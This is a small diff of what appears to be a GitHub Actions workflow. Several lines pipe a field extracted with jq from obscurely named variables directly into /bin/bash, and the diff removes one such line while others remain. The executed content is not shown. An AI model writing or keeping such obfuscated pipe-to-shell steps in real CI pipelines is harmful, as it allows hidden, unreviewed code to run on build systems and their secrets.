@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$a4" | jq -r .n673 | /bin/bash
           printf '%s' "$tq326" | jq -r .tux48 | /bin/bash
           echo $cs9565 | jq -r .kv6493 | /bin/bash
-          echo $vp8 | jq -r .p7 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
